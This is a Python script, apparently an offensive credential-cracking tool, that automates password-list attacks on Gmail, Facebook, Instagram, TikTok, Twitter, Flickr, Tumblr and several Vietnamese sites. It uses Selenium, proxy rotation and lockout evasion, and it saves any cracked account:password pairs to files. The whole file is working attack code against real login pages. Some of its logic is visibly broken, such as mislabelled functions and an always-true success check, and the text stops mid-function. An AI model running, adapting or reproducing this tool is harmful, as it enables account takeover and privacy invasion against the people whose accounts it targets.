#!/usr/bin/python
# -*- coding: utf-8 -*-
from ast import For
import smtplib
import threading
from optparse import *
import time
import sys
import io
import os
from GetProxy import getProxies
try:
    from selenium import webdriver
except:
    os.system("pip install selenium")
from selenium.webdriver.common.proxy import Proxy, ProxyType
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
import selenium.common.exceptions
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.select import Select
try:
    import requests
except:
    os.system("pip install requests")
try:
    from colorama import Fore, Back, Style
except:
    os.system("pip install colorama")
use = OptionParser("""{}
============================================================================================
-> --getproxylist                   export_filename (E.x: proxy_list.txt)
-~ --type                           Type Social media (E.x: facebook or facebook|instagram)
-< --loadproxylist                  import_filename
-a --gmail                          ACCOUNT gmail @gmail.com
-b --youtube                        ACCOUNT youtube @
-c --tiktok                         ACCOUNT tiktok @
-d --twitter                        ACCOUNT twitter @
-e --facebook                       ACCOUNT facebook @
-f --instagram                      Account instagram
-g --gapo                           ACCOUNT gapo
-i --biztime                        ACCOUNT biztime
-j --hahalolo                       ACCOUNT hahalolo
-k --flickr                         ACCOUNT flickr
-l --tumblr                         ACCOUNT tumblr
-m --zoimas                         ACCOUNT zoimas
-n --befilo                         ACCOUNT befilo
-o --desentric                      ACCOUNT desentric
-p --opportunity                    ACCOUNT opportunity
-q --flickr                         ACCOUNT flickr
-r --xing                           ACCOUNT xing
-# --list                           List    Password BruteForce
-h --help                           Show this help message and exit
============================================================================================
{}""".format(Fore.LIGHTCYAN_EX, Fore.RESET))

use.add_option("->", "--getproxylist", dest="getproxylist",
               help="Export list proxy from website")
use.add_option("-~", "--type", dest="type",
               help="Type Social Media")
use.add_option("-<", "--loadProxyList", dest="loadproxylist",
               help="Import list proxy from file")
use.add_option("-a", "--gmail", dest="gmail",
               help="Write Your Account Gmail")
use.add_option("-b", "--youtube", dest="youtube",
               help="Write Your Account Youtube")
use.add_option("-c", "--tiktok", dest="tiktok",
               help="Write Your Account Tiktok")
use.add_option("-d", "--twitter", dest="twitter",
               help="Write Your Account Twitter")
use.add_option("-e", "--facebook", dest="facebook",
               help="Write Your Account Facebook")
use.add_option("-f", "--instagram", dest="instagram",
               help="Write Your Account Instagram")
use.add_option("-g", "--gapo", dest="gapo",
               help="Write Your Account Gapo")
use.add_option("-i", "--biztime", dest="biztime",
               help="Write Your Account Biztime")
use.add_option("-j", "--hahalolo", dest="hahalolo",
               help="Write Your Account Hahalolo")
use.add_option("-k", "--flickr", dest="flickr",
               help="Write Your Account Flickr")
use.add_option("-l", "--tumblr", dest="tumblr",
               help="Write Your Account Tumblr")
use.add_option("-m", "--zoimas", dest="zoimas",
               help="Write Your Account Zoimas")
use.add_option("-n", "--befilo", dest="befilo",
               help="Write Your Account Befilo")
use.add_option("-o", "--desentric", dest="desentric",
               help="Write Your Account Desentric")
use.add_option("-p", "--opportunity", dest="opportunity",
               help="Write Your Account Opportunity")
use.add_option("-q", "--flipboard", dest="flipboard",
               help="Write Your Account Flipboard")
use.add_option("-r", "--xing", dest="xing",
               help="Write Your Account Xing")
use.add_option("-#", "--list", dest="list_password",
               help="Write Your list password")
(options, args) = use.parse_args()
url_list = ['https://www.facebook.com/login', 'https://www.youtube.com/',
            'https://www.instagram.com', 'https://www.tiktok.com/login/phone-or-email/email', 'https://twitter.com/i/flow/login', 'https://www.gapo.vn/', 'https://biztime.com.vn/', 'https://accounts.hahalolo.com/sign-in/', 'https://identity.flickr.com/login', 'https://www.tumblr.com/login', 'https://zoimas.com/welcome/login', 'https://befilo.com/welcome/login', 'https://desentric.com//guest', 'https://myopportunity.com/signin', 'https://login.xing.com/']
social_name = ['facebook', 'youtube', 'instagram',
               'tiktok', 'twitter', 'gapo', 'biztime', 'hahalolo', 'flickr', 'tumblr', 'zoimas', 'befilo', 'desentric', 'opportunity', 'xing']
# ===============================Get Proxy List============================


def getProxyList():
    getProxies(options.getproxylist, options.type)

    # =================================LOAD PROXY==============================
proxy_list = []


def load_proxy_list(socialname):
    while True:
        try:
            proxies = io.open(options.loadproxylist,
                              "r").readlines().pop().split(',')
            for i in range(0, len(proxies)-1):
                element_proxy = proxies[i].split('-')
                if element_proxy[0] == socialname:
                    proxy_list.append(element_proxy[1])
            break
        except:
            print(Fore.LIGHTMAGENTA_EX+"[i] File proxy error"+Fore.RESET)
            time.sleep(10)
# ==============================CHANGE PROXY===============================


def changeProxy(socialname):
    while True:
        if len(proxy_list) == 0:
            load_proxy_list(socialname)
        try:
            myproxy = proxy_list.pop(0)
            requests.get(url_list[social_name.index(socialname)],
                         proxies={'https': myproxy, 'http': myproxy}, timeout=1)
            print(Fore.LIGHTGREEN_EX+"[V]"+"-> "+myproxy+Fore.RESET)
            proxy = Proxy()
            proxy.proxy_type = ProxyType.MANUAL
            proxy.http_proxy = myproxy
            proxy.ssl_proxy = myproxy
            capabilities = webdriver.DesiredCapabilities.FIREFOX
            proxy.add_to_capabilities(capabilities)
            return capabilities
        except KeyboardInterrupt:
            break
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTRED_EX+"[X]"+"-> "+myproxy+Fore.RESET)
            continue
        except:
            print(Fore.LIGHTRED_EX +
                  "[!] Change proxy Error. Again..."+Fore.RESET)


# ==========================LOAD PASSWORD LIST=============================
password_list = []


def load_password_list():
    for passwd in io.open(options.list_password, "r").readlines():
        password_list.append(passwd.rstrip("\n"))
# ============================FACEBOOK=====================================


def facebook():
    brows = None
    count_while = 0
    count_login = 0
    print("{}Facebook Account: {}".format(Fore.LIGHTCYAN_EX, options.facebook))
    print("{}<<<<<<+++++Start Attacking Facebook+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login % 10 == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('facebook'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://facebook.com/login")
                try:
                    brows.find_element(
                        By.XPATH, "//*[@id='facebook']/body/div[3]/div[2]/div/div/div/div/div[3]/button[2]").click()
                except:
                    print
                try:
                    brows.find_element(
                        By.XPATH, "//div[@id='content']/div/div/div[3]/div/div/label/input").click()
                    count_login = 0
                    continue
                except:
                    print
            send_keys(brows.find_element(By.ID, "email"), options.facebook)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(By.ID, "pass"), password)
            brows.find_element(By.ID, "loginbutton").click()
            try:
                if brows.find_element(By.XPATH, "//div[@id='error_box']/div").text == "Access Denied":
                    count_login = 0
                    continue
            except:
                count_login
            if 'https://www.facebook.com/?sk=welcome' in brows.current_url or 'https://www.facebook.com/checkpoint' in brows.current_url:
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Facebook.txt", "a").write(
                    options.facebook+":"+password_list[count_login]+"\n")
                break
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_login += 1
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break

# ==================================YOUTUBE======================================

# //*[@id='content']/div/div[6]/div/ytd-button-renderer/a/tp-yt-paper-button Chấp nhận tất cả


def youtube():
    brows = None
    print("Youtube Account: {}".format(options.youtube))
    print("{}<<<<<<+++++Start  Attacking Youtube+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = webdriver.Firefox(executable_path=r"geckodriver.exe")
    brows.get("https://www.youtube.com/")
    try:
        brows.find_element(
            By.XPATH, "//*[@id='topbar']/div[2]/div[2]/ytd-button-renderer/a").click()
        brows.find_element(
            By.XPATH, "//*[@id='buttons']/ytd-button-renderer").click()
    except Exception as e:
        print(e)
    brows.implicitly_wait(5)
    send_keys(brows.find_element(By.ID, "identifierId"), options.youtube)
    brows.find_element(By.ID, "identifierNext").click()
    brows.implicitly_wait(5)
    for password in io.open(options.list_password, "r").readlines():
        password = password.rstrip('\n')
        print('\rPassword [==] {} '.format(password).rstrip("\n"))
        sys.stdout.flush
        try:
            send_keys(brows.find_element(
                By.XPATH, "//*[@id='password']/div/div/div/input"), password)
            brows.find_element(By.ID, "loginbutton").click()
            brows.find_element(By.ID, "identifierNext").click()
            if 'https://www.youtube.com' in brows.current_url:
                print("{}[V] {}{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Youtube.txt", "a").write(
                    options.youtube+":"+password+"\n")
                break
            else:
                print("{}[X] {}{}".format(
                    Fore.LIGHTRED_EX, password, Fore.RESET))
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break


# =================================GMAIL==========================================
# xgevlqrasamvxqwb

def gmail():
    count_while = 0
    print("{}<<<<<<+++++Start Attacking Gmail+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    s = smtplib.SMTP_SSL('smtp.gmail.com')
    while count_while < len(password_list):
        password = password_list[count_while]
        count_while += 1
        try:
            s.login(options.gmail, password)
            print("{}[V] Password Found [{}]{}".format(
                Fore.LIGHTGREEN_EX, password, Fore.RESET))
            io.open("Gmail.txt", "a").write(
                options.instagram+":"+password+"\n")
            break
        except smtplib.SMTPAuthenticationError:
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)

# ==================================INSTAGRAM===================================


def check_login_instagram(brows):
    try:
        if brows.find_element(By.XPATH, "//*[@id='react-root']/section/nav/div[2]/div/div/div[2]/div/div/span").text == "Tìm kiếm":
            return True
    finally:
        return False


def instagram():
    brows = None
    count_while = 0
    count_login = 0
    print("{}Tiktok Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.tiktok, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    while count_while < len(password_list):
        password = password_list[count_while]
        try:
            password = password_list[count_while]
            if len(password) < 6:
                count_while += 1
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                continue
            if count_login == 0:
                brows = webdriver.Firefox(
                    executable_path=GeckoDriverManager().install())
                brows.get("https://www.instagram.com")
                brows.implicitly_wait(5)
                try:
                    brows.find_element(
                        By.XPATH, "//body/div[4]/div/div/button[1]").click()
                except:
                    print
                send_keys(brows.find_element(
                    By.XPATH, '//*[@id="loginForm"]/div/div/div/label/input'), options.instagram)
                count_login = 1
            send_keys(brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input'), password)
            brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[3]/button').click()
            time.sleep(5)
            if 'https://www.instagram.com/challenge' in brows.current_url or "https://www.instagram.com/accounts" in brows.current_url or check_login_instagram(brows):
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Instagram.txt", "a").write(
                    options.instagram+":"+password+"\n")
                break
            else:
                print("{}[X] {}{}".format(
                    Fore.LIGHTRED_EX, password, Fore.RESET))
            # try:
            #     if brows.find_element(By.XPATH, '//*[@id="slfErrorAlert"]').text == "Chúng tôi không thể kết nối với Instagram. Đảm bảo bạn được kết nối Internet và thử lại.":
            #         brows.quit()
            #         brows = run_web_instagram()
            # except:
            #     print()
            count_while += 1
            brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input').clear()
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break


# =================================TIKTOK======================================
def check_login_tiktok(brows):
    try:
        brows.find_element(By.XPATH, "//*[@id='app']/div/div/div/div/form")
        return True
    except:
        return False


def tiktok():
    brows = None
    count_while = 0
    count_login = 0
    print("{}Tiktok Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.tiktok, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    while count_while < len(password_list):
        password = password_list[count_while]
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('twitter'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.tiktok.com/login/phone-or-email/email")
                send_keys(brows.find_element(
                    By.XPATH, "//*[@id='loginContainer']/div/form/div/input"), options.tiktok)
                count_login = 1
            send_keys(brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/div[2]/div/input"), password)
            brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/button").click()
            if "https://www.tiktok.com/foryou" in brows.current_url or check_login_tiktok(brows):
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Tiktok.txt", "a").write(
                    options.tiktok+":"+password+"\n")
                break
            else:
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/button").clear()
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break


# =================================TWITTER======================================
# Complete
PASS_PATH_TWITTER = "//input[@autocomplete='current-password']"
SUBMIT_PATH_TWITTER = '//*[@id="layers"]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[2]/div/div/div/div'


def check_login_twitter(brows):
    try:
        if "Xác nhận danh tính của bạn bằng cách nhập địa chỉ email liên kết với tài khoản Twitter của bạn." in brows.find_element(
                By.XPATH, "//div[@id='react-root']/div/div/div/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div/div/div/div/div[1]/div[1]/div/span/span").text:
            return True
        return False
    except Exception as e:
        print(e)
        return False


def twitter():
    brows = None
    count_while = 0
    count_login = 0
    print("{}Twitter Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.twitter, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Twitter+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('twitter'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://twitter.com/i/flow/login")
                send_keys(brows.find_element(By.NAME, "text"), options.twitter)
                brows.find_element(
                    By.XPATH, "//*[@id='layers']/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[1]/div/div/div[6]").click()
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, PASS_PATH_TWITTER), password)
            brows.find_element(By.XPATH, SUBMIT_PATH_TWITTER).click()
            # try:
            #     brows.find_element(By.XPATH, "//div[@role='button']")
            #     brows.quit()
            #     count_login = 0
            #     continue
            # except:
            #     print
            time.sleep(2)
            if brows.current_url == "https://twitter.com/" or brows.current_url == "https://twitter.com/home" or 'https://twitter.com/account/login_challenge' or check_login_twitter(brows) in brows.current_url:
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Twitter.txt", "a").write(
                    options.twitter+":"+password+"\n")
                break
            else:
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break

# =================================GAPO========================================


def gapo():
    brows = None
    count_while = 0
    count_login = 0
    print("{}Gapo Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.gapo, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Gapo+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    path = "//div[@id='root']/div[2]/div/div[2]/"
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('gapo'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.gapo.vn/login")
                send_keys(brows.find_element(
                    By.XPATH, path+"div[3]/input"), options.gapo)
                brows.find_element(By.XPATH, path+"button").click()
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            if len(password) < 8 or len(password) > 50:
                count_while += 1
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                continue
            send_keys(brows.find_element(
                By.XPATH, path+"div[2]/input"), password)
            brows.find_element(By.XPATH, path+"button").click()
            try:
                if brows.find_element(By.XPATH, "//div[@class='modal-body']").text == "Bạn đã đạt giới hạn số lần đăng nhập. Bạn vui lòng thử lại sau!":
                    brows.quit()
                    count_login = 0
                    continue
                brows.find_element(
                    By.XPATH, "//button[@class='btn btn-sm btn-primary']").click()
                brows.find_element(By.XPATH, path+"div[2]/input").clear()
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_while += 1
            except selenium.common.exceptions.NoSuchElementException:
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("gapo-" +
                                                            options.gapo+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# =================================BIZTIME=====================================


def biztime():
    count_while = 0
    count_login = 0
    brows = None
    print("{}Biztime Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.biztime, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Biztime+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    op = Options()
    # op.headless = True
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('biztime'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://biztime.com.vn/")
                send_keys(brows.find_element(
                    By.NAME, "username"), options.biztime)
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(By.NAME, "password"), password)
            brows.find_element(
                By.XPATH, "//button[@class='btn btn-main btn-mat disable_btn tag_wel_btn']").click()
            try:
                brows.find_element(
                    By.XPATH, "//div[@class='valign tag_auth_animation']")
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("biztime-" +
                                                            options.biztime+":"+password+"\n")
                brows.quit()
                break
            except:
                if brows.find_element(By.XPATH, "//div[@class='errors']").text == "Tạm khóa 10 phút do bạn đăng nhập sai nhiều lần!":
                    brows.quit()
                    count_login = 0
                    continue
                brows.find_element(By.NAME, "password").clear()
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# =================================HAHALOLO====================================


def hahalolo():
    brows = None
    count_while = 0
    count_login = 0
    print("\rHahalolo Account: {}".format(options.hahalolo))
    print("{}<<<<<<+++++Start Attacking Hahalolo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('hahalolo'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://accounts.hahalolo.com/sign-in/")
                try:
                    send_keys(brows.find_element(
                        By.ID, "accountId"), options.hahalolo)
                except:
                    brows.quit()
                    count_login = 0
                    continue
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(By.ID, "password"), password)
            brows.find_element(
                By.XPATH, "//div[@id='app']/div/div/div/div/div[2]/div/div/div/div[2]").click()
            try:
                brows.find_element(By.ID, "captcha-code")
                count_login = 0
                brows.quit()
                continue
            except:
                count_login
            brows.find_element(By.ID, "password").clear()
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_while += 1
        except selenium.common.exceptions.NoSuchElementException:
            print(
                "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
            io.open("BruteForce_result.txt", "a").write("hahalolo-" +
                                                        options.hahalolo+":"+password+"\n")
            brows.quit()
            break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================FLICKR=======================================


def flickr():
    count_while = 0
    count_login = 0
    print("{}Flickr Account: {}".format(Fore.LIGHTCYAN_EX, options.flickr))
    print("{}<<<<<<+++++Start Attacking Flickr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = None
    er_id = ""
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('flickr'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://identity.flickr.com/login")
                send_keys(brows.find_element(
                    By.XPATH, "//input[@id='login-email']"), options.flickr)
                brows.find_element(
                    By.XPATH, "//form/button").click()
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@id='login-password']"), password)
            brows.find_element(
                By.XPATH, "//form/button").click()
            try:
                brows.implicitly_wait(15)
                while True:
                    er_id_new = brows.find_element(By.XPATH, "//form//p").id
                    if er_id_new != er_id:
                        er_id = er_id_new
                        break
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("flickr-" +
                                                            options.flickr+":"+password+"\n")
                brows.quit()
                break
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            brows.find_element(
                By.XPATH, "//input[@id='login-password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
            count_login += 1
            if count_login == 4:
                count_login = 0
                brows.quit()
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================TUMBLR=======================================
# not


def tumblr():
    count_while = 0
    count_login = 0
    print("{}Tumblr Account: {}".format(Fore.LIGHTCYAN_EX, options.tumblr))
    print("{}<<<<<<+++++Start Attacking Tumblr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = None
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('tumblr'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.tumblr.com/login")
                send_keys(brows.find_element(
                    By.XPATH, "//input[@name='email']"), options.tumblr)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "//form/button").click()
            try:
                t = time.time()
                while brows.find_element(By.XPATH, "//span[@class='EvhBA']").text != "Log in":
                    if time.time() - t > 7:
                        brows.quit()
                        count_login = 0
                        continue
                if brows.find_element(By.XPATH, "//div[@class='oFCPF']").text == "Oops. There was an error. Try again.":
                    count_login = 0
                    brows.quit()
                    continue
                brows.find_element(
                    By.XPATH, "//input[@name='password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_login += 1
                if count_login == 5:
                    count_login = 0
                    brows.quit()
                count_while += 1
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("tumblr-" +
                                                            options.tumblr+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================ZOIMAS=======================================


def zoimas():
    count_while = 0
    count_login = 0
    print("{}Zoimas Account: {}".format(Fore.LIGHTCYAN_EX, options.zoimas))
    print("{}<<<<<<+++++Start Attacking Zoimas++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = None
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('zoimas'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://zoimas.com/welcome/login")
                send_keys(brows.find_element(
                    By.XPATH, "//input[@name='username']"), options.zoimas)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "//button[@class='login-button']").click()
            try:
                brows.find_element(
                    By.XPATH, "//p[normalize-space()='Invalid username or password']")
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                brows.find_element(
                    By.XPATH, "//input[@name='password']").clear()
                count_login += 1
                count_while += 1
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("zoimas-" +
                                                            options.zoimas+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================BEFILO=======================================


def befilo():
    count_while = 0
    count_login = 0
    print("{}Befilo Account: {}".format(Fore.LIGHTCYAN_EX, options.befilo))
    print("{}<<<<<<+++++Start Attacking Befilo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = None
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('befilo'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://befilo.com/welcome/login")
                send_keys(brows.find_element(
